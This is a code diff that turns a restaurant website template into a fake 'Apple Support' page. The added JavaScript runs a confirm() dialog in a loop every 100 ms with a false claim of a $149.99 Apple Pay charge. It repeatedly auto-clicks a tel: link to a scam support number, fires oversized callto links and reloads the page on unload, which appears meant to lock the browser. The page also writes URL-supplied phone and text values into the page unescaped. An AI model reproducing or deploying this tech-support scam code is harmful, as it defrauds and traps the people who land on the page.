-                                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore.</p>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <!-- Our Services End -->
-        <!--? About-3 Start -->
-        <div class="about-area3 pt-180 pb-170 section-bg" data-background="assets/img/gallery/section_bg03.png">
-            <div class="container">
-                <div class="row justify-content-end">
-                    <div class="col-xl-6 col-lg-6 col-md-9 col-sm-11">
-                        <!-- Section Tittle -->
-                        <div class="section-tittle section-tittle2 mb-40">
-                            <span>About Our Restaurant</span>
-                            <h2>We Provide Good Food For Your Family!</h2>
-                            <p>Ut enim acgsd minim veniam, quxcis nostrud exercitation ullamco laboris nisi ufsit aliquip ex ea commodo consequat is aute irure m, quis nostrud exer.</p>
-                        </div> 
-                        <!--Hero form -->
-                        <form action="#" class="search-box">
-                            <div class="input-form">
-                                <input type="text" placeholder="Your Email">
-                            </div>
-                            <div class="search-form">
-                                <button>Subscribe</button>
-                            </div>	
-                        </form>	
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- About-3 End -->
-        <!--? Blog Area Start -->
-        <section class="blogs-area section-padding30">
-            <div class="container">
-                <div class="row justify-content-center">
-                    <div class="col-lg-6">
-                        <!-- Section Tittle -->
-                        <div class="section-tittle text-center mb-70">
-                            <span>Our New Blog News</span>
-                            <h2>Our Recnet News</h2>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
                         </div>
                     </div>
-                </div>
-                <div class="row">
-                    <div class="col-lg-4 col-md-6">
-                        <div class="single-blogs mb-100">
-                            <div class="blog-img">
-                                <img src="assets/img/gallery/blog1.png" alt="">
-                            </div>
-                            <div class="blog-cap">
-                                <span class="color1">23 Dec, 2020</span>
-                                <h4><a href="blog_details.html">Addiction When Food Plate Becomes</a></h4>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-6">
-                        <div class="single-blogs mb-100">
-                            <div class="blog-img">
-                                <img src="assets/img/gallery/blog2.png" alt="">
-                            </div>
-                            <div class="blog-cap">
-                                <span class="color1">23 Dec, 2020</span>
-                                <h4><a href="blog_details.html">Addiction When Food Plate Becomes</a></h4>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-6">
-                        <div class="single-blogs mb-100">
-                            <div class="blog-img">
-                                <img src="assets/img/gallery/blog3.png" alt="">
-                            </div>
-                            <div class="blog-cap">
-                                <span class="color1">23 Dec, 2020</span>
-                                <h4><a href="blog_details.html">Addiction When Food Plate Becomes</a></h4>
-                            </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
                     </div>
                 </div>
             </div>
         </section>
-        <!-- Blog Area End -->
-    </main>
-    <footer>
-        <!--? Footer Start-->
-        <div class="footer-area section-bg" data-background="assets/img/gallery/section_bg02.png">
-            <div class="container">
-                <div class="footer-top footer-padding">
-                    <div class="row d-flex justify-content-between">
-                        <div class="col-xl-4 col-lg-4 col-md-5 col-sm-8">
-                            <div class="single-footer-caption mb-50">
-                                <!-- logo -->
-                                <div class="footer-logo">
-                                    <a href="index.html"><img src="assets/img/logo/logo2_footer.png" alt=""></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-xl-2 col-lg-2 col-md-5 col-sm-6">
-                            <div class="single-footer-caption mb-50">
-                                <div class="footer-tittle">
-                                    <h4>Navigation</h4>
-                                    <ul>
-                                        <li><a href="#">Home</a></li>
-                                        <li><a href="#">Events</a></li>
-                                        <li><a href="#">Testimonial</a></li>
-                                        <li><a href="#">Categories</a></li>
-                                        <li><a href="#">Contacts</a></li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-xl-2 col-lg-2 col-md-5 col-sm-6">
-                            <div class="single-footer-caption mb-50">
-                                <div class="footer-tittle">
-                                    <h4>Useful Links</h4>
-                                    <ul>
-                                        <li><a href="#">Registration</a></li>
-                                        <li><a href="#">Login</a></li>
-                                        <li><a href="#">Policy</a></li>
-                                        <li><a href="#">Terms & Conditions</a></li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                        <!-- Instagram -->
-                        <div class="col-xl-4 col-lg-4 col-md-5 col-sm-7">
-                            <div class="single-footer-caption mb-50">
-                                <div class="footer-tittle">
-                                    <h4>Instagram Feed</h4>
-                                </div>
-                                <div class="instagram-gellay">
-                                    <ul class="insta-feed">
-                                        <li><a href="#"><img src="assets/img/gallery/instagram1.png" alt=""></a></li>
-                                        <li><a href="#"><img src="assets/img/gallery/instagram2.png" alt=""></a></li>
-                                        <li><a href="#"><img src="assets/img/gallery/instagram3.png" alt=""></a></li>
-                                        <li><a href="#"><img src="assets/img/gallery/instagram4.png" alt=""></a></li>
-                                        <li><a href="#"><img src="assets/img/gallery/instagram5.png" alt=""></a></li>
-                                        <li><a href="#"><img src="assets/img/gallery/instagram6.png" alt=""></a></li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-                <div class="footer-bottom">
-                    <div class="row d-flex justify-content-between align-items-center">
-                        <div class="col-xl-9 col-lg-8">
-                            <div class="footer-copy-right">
-                                <p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-  Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-  <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-                            </div>
-                        </div>
-                        <div class="col-xl-3 col-lg-4">
-                            <!-- Footer Social -->
-                            <div class="footer-social f-right">
-                                <span>Follow Us</span>
-                                <a href="#"><i class="fab fa-twitter"></i></a>
-                                <a href="https://www.facebook.com/sai4ull"><i class="fab fa-facebook-f"></i></a>
-                                <a href="#"><i class="fas fa-globe"></i></a>
-                                <a href="#"><i class="fab fa-instagram"></i></a>
-                            </div>
-                        </div>
-                    </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
                 </div>
-            </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-855-657-8360
+			 " property="telephone">
+            </section>
         </div>
-        <!-- Footer End-->
     </footer>
-    <!-- Scroll Up -->
-    <div id="back-top" >
-        <a title="Go to Top" href="#"> <i class="fas fa-level-up-alt"></i></a>
-    </div>
 
-    <!-- JS here -->
 
-    <script src="./assets/js/vendor/modernizr-3.5.0.min.js"></script>
-    <!-- Jquery, Popper, Bootstrap -->
-    <script src="./assets/js/vendor/jquery-1.12.4.min.js"></script>
-    <script src="./assets/js/popper.min.js"></script>
-    <script src="./assets/js/bootstrap.min.js"></script>
-    <!-- Jquery Mobile Menu -->
-    <script src="./assets/js/jquery.slicknav.min.js"></script>
 
-    <!-- Jquery Slick , Owl-Carousel Plugins -->
-    <script src="./assets/js/owl.carousel.min.js"></script>
-    <script src="./assets/js/slick.min.js"></script>
-    <!-- One Page, Animated-HeadLin -->
-    <script src="./assets/js/wow.min.js"></script>
-    <script src="./assets/js/animated.headline.js"></script>
-    <script src="./assets/js/jquery.magnific-popup.js"></script>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-    <!-- Date Picker -->
-    <script src="./assets/js/gijgo.min.js"></script>
-    <!-- Nice-select, sticky -->
-    <script src="./assets/js/jquery.nice-select.min.js"></script>
-    <script src="./assets/js/jquery.sticky.js"></script>
-    
-    <!-- contact js -->
-    <script src="./assets/js/contact.js"></script>
-    <script src="./assets/js/jquery.form.js"></script>
-    <script src="./assets/js/jquery.validate.min.js"></script>
-    <script src="./assets/js/mail-script.js"></script>
-    <script src="./assets/js/jquery.ajaxchimp.min.js"></script>
-    
-    <!-- Jquery Plugins, main Jquery -->	
-    <script src="./assets/js/plugins.js"></script>
-    <script src="./assets/js/main.js"></script>
-    
-    </body>
-</html>
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-855-657-8360');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-657-8360"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-855-657-8360 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
